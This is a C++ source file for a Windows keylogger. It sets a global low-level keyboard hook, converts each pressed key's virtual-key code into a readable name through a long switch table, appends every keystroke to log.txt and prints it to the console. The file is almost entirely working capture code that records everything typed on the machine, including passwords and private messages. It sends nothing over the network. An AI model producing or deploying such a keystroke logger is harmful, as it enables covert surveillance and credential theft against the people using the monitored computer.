#include <iostream>
#include <fstream>
#include <windows.h>

#define FILEPATH "log.txt"

std::string ConvertVkCode(DWORD vkCode) {
    std::string convertedKeyInput;

    switch (vkCode) {
        case VK_ADD : convertedKeyInput = "Numpad +"; break;
        case VK_ATTN : convertedKeyInput = "Attn"; break;
        case VK_BACK : convertedKeyInput = "Backspace"; break;
        case VK_CANCEL : convertedKeyInput = "Break"; break;
        case VK_CLEAR : convertedKeyInput = "Clear"; break;
        case VK_CRSEL : convertedKeyInput = "Cr Sel"; break;
        case VK_DECIMAL : convertedKeyInput = "Numpad ."; break;
        case VK_DIVIDE : convertedKeyInput = "Numpad /"; break;
        case VK_EREOF : convertedKeyInput = "Er Eof"; break;
        case VK_ESCAPE : convertedKeyInput = "Esc"; break;
        case VK_EXECUTE : convertedKeyInput = "Execute"; break;
        case VK_EXSEL : convertedKeyInput = "Ex Sel"; break;
        case VK_MULTIPLY : convertedKeyInput = "Numpad *"; break;
        case VK_NONAME : convertedKeyInput = "NoName"; break;
        case VK_NUMPAD0 : convertedKeyInput = "Numpad 0"; break;
        case VK_NUMPAD1 : convertedKeyInput = "Numpad 1"; break;
        case VK_NUMPAD2 : convertedKeyInput = "Numpad 2"; break;
        case VK_NUMPAD3 : convertedKeyInput = "Numpad 3"; break;
        case VK_NUMPAD4 : convertedKeyInput = "Numpad 4"; break;
        case VK_NUMPAD5 : convertedKeyInput = "Numpad 5"; break;
        case VK_NUMPAD6 : convertedKeyInput = "Numpad 6"; break;
        case VK_NUMPAD7 : convertedKeyInput = "Numpad 7"; break;
        case VK_NUMPAD8 : convertedKeyInput = "Numpad 8"; break;
        case VK_NUMPAD9 : convertedKeyInput = "Numpad 9"; break;
        case VK_OEM_1 : convertedKeyInput = "OEM_1 (: ;)"; break;
        case VK_OEM_102 : convertedKeyInput = "OEM_102 (> <)"; break;
        case VK_OEM_2 : convertedKeyInput = "OEM_2 (? /)"; break;
        case VK_OEM_3 : convertedKeyInput = "OEM_3 (~ `)"; break;
        case VK_OEM_4 : convertedKeyInput = "OEM_4 ({ [)"; break;
        case VK_OEM_5 : convertedKeyInput = "OEM_5 (| \\)"; break;
        case VK_OEM_6 : convertedKeyInput = "OEM_6 (} ])"; break;
        case VK_OEM_7 : convertedKeyInput = "OEM_7 (\" ')"; break;
        case VK_OEM_8 : convertedKeyInput = "OEM_8 (§ !)"; break;
        case VK_OEM_CLEAR : convertedKeyInput = "OemClr"; break;
        case VK_OEM_COMMA : convertedKeyInput = "OEM_COMMA (< ,)"; break;
        case VK_OEM_MINUS : convertedKeyInput = "OEM_MINUS (_ -)"; break;
        case VK_OEM_PERIOD : convertedKeyInput = "OEM_PERIOD (> .)"; break;
        case VK_OEM_PLUS : convertedKeyInput = "OEM_PLUS (+ =)"; break;
        case VK_PA1 : convertedKeyInput = "Pa1"; break;
        case VK_PACKET : convertedKeyInput = "Packet"; break;
        case VK_PLAY : convertedKeyInput = "Play"; break;
        case VK_PROCESSKEY : convertedKeyInput = "Process"; break;
        case VK_RETURN : convertedKeyInput = "Enter"; break;
        case VK_SELECT : convertedKeyInput = "Select"; break;
        case VK_SEPARATOR : convertedKeyInput = "Separator"; break;
        case VK_SPACE : convertedKeyInput = "Space"; break;
        case VK_SUBTRACT : convertedKeyInput = "Num -"; break;
        case VK_TAB : convertedKeyInput = "Tab"; break;
        case VK_ZOOM : convertedKeyInput = "Zoom"; break;
        case VK_ACCEPT : convertedKeyInput = "Accept"; break;
        case VK_APPS : convertedKeyInput = "Context Menu"; break;
        case VK_BROWSER_BACK : convertedKeyInput = "Browser Back"; break;
        case VK_BROWSER_FAVORITES : convertedKeyInput = "Browser Favorites"; break;
        case VK_BROWSER_FORWARD : convertedKeyInput = "Browser Forward"; break;
        case VK_BROWSER_HOME : convertedKeyInput = "Browser Home"; break;
        case VK_BROWSER_REFRESH : convertedKeyInput = "Browser Refresh"; break;
        case VK_BROWSER_SEARCH : convertedKeyInput = "Browser Search"; break;
        case VK_BROWSER_STOP : convertedKeyInput = "Browser Stop"; break;
        case VK_CAPITAL : convertedKeyInput = "Caps Lock"; break;
        case VK_CONVERT : convertedKeyInput = "Convert"; break;
        case VK_DELETE : convertedKeyInput = "Delete"; break;
        case VK_DOWN : convertedKeyInput = "Arrow Down"; break;
        case VK_END : convertedKeyInput = "End"; break;
        case VK_F1 : convertedKeyInput = "F1"; break;
        case VK_F10 : convertedKeyInput = "F10"; break;
        case VK_F11 : convertedKeyInput = "F11"; break;
        case VK_F12 : convertedKeyInput = "F12"; break;
        case VK_F13 : convertedKeyInput = "F13"; break;
        case VK_F14 : convertedKeyInput = "F14"; break;
        case VK_F15 : convertedKeyInput = "F15"; break;
        case VK_F16 : convertedKeyInput = "F16"; break;
        case VK_F17 : convertedKeyInput = "F17"; break;
        case VK_F18 : convertedKeyInput = "F18"; break;
        case VK_F19 : convertedKeyInput = "F19"; break;
        case VK_F2 : convertedKeyInput = "F2"; break;
        case VK_F20 : convertedKeyInput = "F20"; break;
        case VK_F21 : convertedKeyInput = "F21"; break;
        case VK_F22 : convertedKeyInput = "F22"; break;
        case VK_F23 : convertedKeyInput = "F23"; break;
        case VK_F24 : convertedKeyInput = "F24"; break;
        case VK_F3 : convertedKeyInput = "F3"; break;
        case VK_F4 : convertedKeyInput = "F4"; break;
        case VK_F5 : convertedKeyInput = "F5"; break;
        case VK_F6 : convertedKeyInput = "F6"; break;
        case VK_F7 : convertedKeyInput = "F7"; break;
        case VK_F8 : convertedKeyInput = "F8"; break;
        case VK_F9 : convertedKeyInput = "F9"; break;
        case VK_FINAL : convertedKeyInput = "Final"; break;
        case VK_HELP : convertedKeyInput = "Help"; break;
        case VK_HOME : convertedKeyInput = "Home"; break;
        case VK_INSERT : convertedKeyInput = "Insert"; break;
        case VK_JUNJA : convertedKeyInput = "Junja"; break;
        case VK_KANA : convertedKeyInput = "Kana"; break;
        case VK_KANJI : convertedKeyInput = "Kanji"; break;
        case VK_LAUNCH_APP1 : convertedKeyInput = "App1"; break;
        case VK_LAUNCH_APP2 : convertedKeyInput = "App2"; break;
        case VK_LAUNCH_MAIL : convertedKeyInput = "Mail"; break;
        case VK_LAUNCH_MEDIA_SELECT : convertedKeyInput = "Media"; break;
        case VK_LBUTTON : convertedKeyInput = "Left Button **"; break;
        case VK_LCONTROL : convertedKeyInput = "Left Ctrl"; break;
        case VK_LEFT : convertedKeyInput = "Arrow Left"; break;
        case VK_LMENU : convertedKeyInput = "Left Alt"; break;
        case VK_LSHIFT : convertedKeyInput = "Left Shift"; break;
        case VK_LWIN : convertedKeyInput = "Left Win"; break;
        case VK_MBUTTON : convertedKeyInput = "Middle Button **"; break;
        case VK_MEDIA_NEXT_TRACK : convertedKeyInput = "Next Track"; break;
        case VK_MEDIA_PLAY_PAUSE : convertedKeyInput = "Play / Pause"; break;
        case VK_MEDIA_PREV_TRACK : convertedKeyInput = "Previous Track"; break;
        case VK_MEDIA_STOP : convertedKeyInput = "Stop"; break;
        case VK_MODECHANGE : convertedKeyInput = "Mode Change"; break;
        case VK_NEXT : convertedKeyInput = "Page Down"; break;
        case VK_NONCONVERT : convertedKeyInput = "Non Convert"; break;
        case VK_NUMLOCK : convertedKeyInput = "Num Lock"; break;
        case VK_PAUSE : convertedKeyInput = "Pause"; break;
        case VK_PRINT : convertedKeyInput = "Print"; break;
        case VK_PRIOR : convertedKeyInput = "Page Up"; break;
        case VK_RBUTTON : convertedKeyInput = "Right Button **"; break;
        case VK_RCONTROL : convertedKeyInput = "Right Ctrl"; break;
        case VK_RIGHT : convertedKeyInput = "Arrow Right"; break;
        case VK_RMENU : convertedKeyInput = "Right Alt"; break;
        case VK_RSHIFT : convertedKeyInput = "Right Shift"; break;
        case VK_RWIN : convertedKeyInput = "Right Win"; break;
        case VK_SCROLL : convertedKeyInput = "Scrol Lock"; break;
        case VK_SLEEP : convertedKeyInput = "Sleep"; break;
        case VK_SNAPSHOT : convertedKeyInput = "Print Screen"; break;
        case VK_UP : convertedKeyInput = "Arrow Up"; break;
        case VK_VOLUME_DOWN : convertedKeyInput = "Volume Down"; break;
        case VK_VOLUME_MUTE : convertedKeyInput = "Volume Mute"; break;
        case VK_VOLUME_UP : convertedKeyInput = "Volume Up"; break;
        case VK_XBUTTON1 : convertedKeyInput = "X Button 1 **"; break;
        case VK_XBUTTON2 : convertedKeyInput = "X Button 2 **"; break;
        default:
            char keyChar = (char)vkCode;
            std::string temp(1, keyChar);
            convertedKeyInput = temp;
            break;
    }
    return convertedKeyInput;
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    BOOL fEatKeystroke = FALSE;

    if (nCode == HC_ACTION)
    {
        PKBDLLHOOKSTRUCT press = (PKBDLLHOOKSTRUCT)lParam;
        DWORD vkCode = press->vkCode; // Get the virtual keycode
        if ((wParam == WM_KEYDOWN) || (wParam == WM_SYSKEYDOWN)) // Keydown
        {
            std::ofstream file(FILEPATH, std::ios_base::app);
            if (file.is_open())
            {
                file << ConvertVkCode(vkCode) << "\n";
                file.close();
            }
            else
            {
                std::cout << "Unable to open the log file.\n";
            }
            std::cout << ConvertVkCode(vkCode) << "\n";
        }
    }
    return(fEatKeystroke ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam));
}

int main()
{
    // dwThreadId is set to 0 to make a global injection
    HHOOK hookLowLevelKeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
    MSG msg;
    while (!GetMessage(&msg, NULL, NULL, NULL))
    {
        // This while loop keeps the hook
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hookLowLevelKeyboard);

    return 0;
}